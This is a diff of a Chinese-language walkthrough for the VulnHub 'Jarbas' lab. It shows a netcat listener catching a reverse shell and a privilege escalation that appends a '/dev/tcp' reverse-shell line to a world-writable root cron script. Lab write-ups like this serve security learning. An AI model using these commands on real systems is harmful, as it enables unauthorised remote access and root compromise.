@@ -184,8 +184,8 @@ Target: http://192.168.218.191/
 [09:09:36] 403 -  210B  - /cgi-bin/               
                                                   
 Task Completed
-
 ```
+
 以防万一都扫一下
 
 只扫出来一个access.html页面看一下，好像是三组凭证，密码加密，尝试解密，我使用的[解密网站](https://hashes.com/en/decrypt/hash)，感觉还行，三个密码都破解了。但是都试了一下ssh，无法登录。
@@ -203,7 +203,9 @@ Task Completed
 <img width="1919" height="1040" alt="Image" src="https://github.com/user-attachments/assets/19adf448-7fb0-4425-bed2-65cd50ddde16" />
 
 <img width="1919" height="1036" alt="Image" src="https://github.com/user-attachments/assets/e013f654-7089-436c-9538-503778bba71f" />
+
 再kali上监听4444端口，拿反弹shell
+
 ```
 ┌──(kali㉿kali)-[~/…/writeup/vulnhub/jarbas/nmapScan]
 └─$ nc -lvnp 4444
@@ -214,10 +216,11 @@ bash-4.2$ id
 id
 uid=997(jenkins) gid=995(jenkins) groups=995(jenkins) context=system_u:system_r:initrc_t:s0
 bash-4.2$ 
-
 ```
+
 ## 提权
 翻找了一会，没发现提权的信息，也登录不上eder的账户，然后再找，在看定时任务的时候有发现
+
 ```
 bash-4.2$ cat /etc/crontab
 cat /etc/crontab
@@ -239,12 +242,13 @@ MAILTO=root
 bash-4.2$ ls -la /etc/script/CleaningSce^Hript.sh
 ls -la /etc/script/CleaningScript.sh
 -rwxrwxrwx. 1 root root 50 Apr  1  2018 /etc/script/CleaningScript.sh
-
 ```
+
 并且这个脚本权限为777，那就简单了，直接追加反弹 shell 命令
 `echo "bash -i >& /dev/tcp/192.168.218.148/4444 0>&1" >> /etc/script/CleaningScript.sh`
 
 在kali上开启监听，然后等待定时任务执行，就可以提权了。
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4444          
@@ -258,9 +262,9 @@ flag.txt
 id
 uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
 [root@jarbas ~]# 
-
 ```
 好了提权成功
 
-## 反思，这个靶机比较简单，考察信息检索的能力，以及对检索到的信息的利用，以及对这些开源的服务器的漏洞利用，提权也比较简单，主要是寻找自动任务的思路。
+## 反思
+这个靶机比较简单，考察信息检索的能力，以及对检索到的信息的利用，以及对这些开源的服务器的漏洞利用，提权也比较简单，主要是寻找自动任务的思路。
 
